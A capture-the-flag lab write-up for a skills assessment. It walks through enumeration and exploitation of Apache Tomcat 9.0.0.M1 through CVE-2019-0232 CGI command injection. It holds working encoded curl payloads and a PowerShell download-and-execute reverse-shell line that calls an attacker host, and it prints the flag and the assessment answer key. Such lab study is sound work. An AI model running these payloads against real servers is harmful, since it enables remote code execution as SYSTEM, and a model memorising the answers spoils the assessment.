# Section 31 — Skills Assessment I

**Scenario:** Inlanefreight is well-hardened; one host is the way in. Enumerate → foothold → `flag.txt` (Administrator desktop). Black-box, no creds.

## ✅ Answers (verified live — 10.129.100.127)

| Q | Answer |
|---|--------|
| Q1 — vulnerable application | **Apache Tomcat** |
| Q2 — port | **8080** |
| Q3 — version | **9.0.0.M1** |
| Q4 — flag.txt | **`f55763d31a8f63ec935abd07aee5d3d0`** |

---

## Step 1 — Enumerate (don't tunnel-vision)

```bash
nmap -p- -sS -sV -T4 --min-rate 2000 -Pn --open 10.129.100.127
```
Key services:
```
21 ftp (MS ftpd, anon)   80 IIS10   3389 RDP   5985 WinRM
8000  Jetty 9.4.42  -> Jenkins 2.303.1   (X-Jenkins header)
8080  Apache Tomcat/9.0.0.M1  (Coyote)
8009  AJP13  -> Ghostcat-capable
```
> ⚠️ **Lesson learned the hard way:** there were *two* tempting apps — Jenkins (8000) and Tomcat (8080). I tunnelled on Jenkins first and wasted effort. **The intended target is the one that's actually *vulnerable* and matches a taught technique** — fingerprint *all* web ports, get exact versions, then pick. `Apache Tomcat/9.0.0.M1` is a milestone build → maps directly to a known CVE; that's the tell.

Fingerprint each web port:
```bash
curl -s -i http://10.129.100.127:8000/   # -> X-Jenkins: 2.303.1  (decoy/locked down)
curl -s    http://10.129.100.127:8080/   # -> <title>Apache Tomcat/9.0.0.M1</title>
```
> **Q1 = Apache Tomcat, Q2 = 8080, Q3 = 9.0.0.M1.** Version-from-title is the fast path; confirm with the error page footer (`Apache Tomcat/9.0.0.M1 - Error report`).

---

## Step 2 — Pick the exploit (rule out the dead ends)

Tomcat 9.0.0.M1 attack surface — what I tested and *why each failed/succeeded*:

| Vector | Result |
|--------|--------|
| Manager / host-manager weak creds | `/manager/*` → **404**, app not deployed → out |
| CVE-2017-12615 (PUT JSP) | `PUT` → **403** (`readonly=true`) → out |
| CVE-2020-1938 Ghostcat (AJP 8009) | **file-read works** (read `WEB-INF/web.xml`) but FTP is **read-only** (550) so no JSP to include → no RCE, but a useful arbitrary-file-read primitive |
| **CVE-2019-0232 (CGI Servlet RCE)** | ✅ **the way in** |

> Methodology: enumerate the app's *known* vulns for that exact version, then eliminate by testing primitives (manager deployed? PUT allowed? upload path for Ghostcat?). What's left is CVE-2019-0232 — covered in §19.

---

## Step 3 — CVE-2019-0232 (Tomcat CGIServlet RCE, Windows)

Find the CGI script:
```bash
ffuf -u http://10.129.100.127:8080/cgi/FUZZ -e .bat,.cmd -mc 200 \
     -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt
# -> cgi/cmd.bat   (200)
```
> Default CGI dir is `/cgi`; on Windows fuzz `.bat`/`.cmd`. `cmd.bat` (read via Ghostcat) is just `@echo off / echo Content-Type: text/plain / echo .` — a minimal CGI stub. Any accessible CGI script is enough.

### The three gotchas that made this hard (document these!)

```bash
B=http://10.129.100.127:8080/cgi/cmd.bat
```

1. **Argument separator is `+`, NOT `%20`.** Per CGI spec an "indexed query" (no `=`) is split on `+` into argv. `?&dir%20\` → empty; `?&dir+%5C` → works (`dir \` → `C:\` listing).
2. **`%5C` (`\`) and `%3A` (`:`) ARE allowed; plaintext `:` `\` are filtered.** URL-encode every backslash/colon: `c:\windows\system32` → `c%3A%5Cwindows%5Csystem32`. (`PATH` is unset → always use full encoded paths for `.exe`s.)
3. **Tomcat's CGI header-parser EATS short output.** `cmd.bat` emits `Content-Type: text/plain` + `.` (no blank line), so single-line output (`echo`, `whoami`, small `type`) is consumed as malformed headers and the body is `Content-Length: 0`. Multi-line `dir` survives — but you can't rely on that.

### Reliable output: redirect to the webroot, fetch directly

cwd is `...\webapps\ROOT\WEB-INF\cgi`, so `..\..\` = `webapps\ROOT` (served at `/`). Redirect command output there and GET it — sidesteps the CGI parser entirely:

```bash
# whoami
curl "$B?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe+%3E+..%5C..%5Cw.txt"
curl http://10.129.100.127:8080/w.txt          # -> nt authority\system

# the flag
curl "$B?&type+c%3A%5CUsers%5CAdministrator%5CDesktop%5Cflag.txt+%3E+..%5C..%5Cp.txt"
curl http://10.129.100.127:8080/p.txt          # -> f55763d31a8f63ec935abd07aee5d3d0
```
> Tokens separated by `+`, every `\`/`:`→`%5C`/`%3A`, `>`→`%3E`. The command runs as **`nt authority\system`** (Tomcat service), so no privesc needed — `type` the Administrator flag directly. Then GET the dropped file from `/` (the webroot).

> **Q4 flag = `f55763d31a8f63ec935abd07aee5d3d0`** (32 bytes — matches the `dir` size).

**Cleanup:** `curl "$B?&del+..%5C..%5Cw.txt"` etc. — remove dropped files (good practice even on labs; confirm with a 404).

### Get an interactive shell (Q4 "obtain a shell")

For a real shell instead of one-shot reads, redirect a downloaded payload similarly, or:
```bash
# host nc64.exe / a PS reverse shell on your box, pull + run via the same injection:
curl "$B?&c%3A%5Cwindows%5Csystem32%5Ccmd.exe+/c+powershell+-c+\"IEX(IWR http://10.10.17.176/r.ps1 -UseBasicParsing)\""
```
> Same encoding rules. Since execution is SYSTEM, the reverse shell is an immediate SYSTEM shell.

---

## Exam Notes

- **Enumerate breadth-first; match version → taught CVE before exploiting.** Two juicy apps (Jenkins/Tomcat) — the *vulnerable, in-scope* one is identified by exact version, not by which looks cooler. Don't tunnel.
- **Eliminate Tomcat vectors fast:** manager 404/401? PUT readonly? Ghostcat needs an upload path? → if all dead, think CGI (CVE-2019-0232).
- **CVE-2019-0232 cheat:** sep=`+`, encode `\:` as `%5C%3A`, `PATH` unset (full paths), and **redirect to webroot + GET** because the CGI parser drops short stdout.
- **Ghostcat (CVE-2020-1938)** is a great *file-read* even when you can't get RCE from it — read `WEB-INF/web.xml`, configs, source.
- Tomcat ran as **SYSTEM** here — always `whoami` first; CGI/service RCE is often already SYSTEM (no privesc).
- Broken `msfconsole` on this build ("uninitialized constant HTTP" for HTTP modules) — don't depend on MSF; hand-craft the request.

---

## Lab Walkthrough (quick steps)

```
1. nmap -p- -sV          -> 8080 Apache Tomcat/9.0.0.M1   (Q1/Q2/Q3)
2. rule out: /manager 404, PUT 403, Ghostcat=read-only (FTP 550)
3. ffuf /cgi/FUZZ.bat    -> /cgi/cmd.bat (200)  [CVE-2019-0232]
4. payload rules: sep '+', \=%5C :=%3A, PATH unset, redirect to ..\..\ (webroot)
5. curl ".../cgi/cmd.bat?&type+c%3A%5CUsers%5CAdministrator%5CDesktop%5Cflag.txt+%3E+..%5C..%5Cp.txt"
6. curl http://<ip>:8080/p.txt   -> f55763d31a8f63ec935abd07aee5d3d0   (Q4) ✅
7. del ..\..\p.txt  (cleanup)
```

> One line: weird port → exact version (9.0.0.M1) → eliminate dead Tomcat vectors → CGI RCE (CVE-2019-0232) with `+`-separated, `%5C/%3A`-encoded args, output redirected to the webroot → SYSTEM → flag.
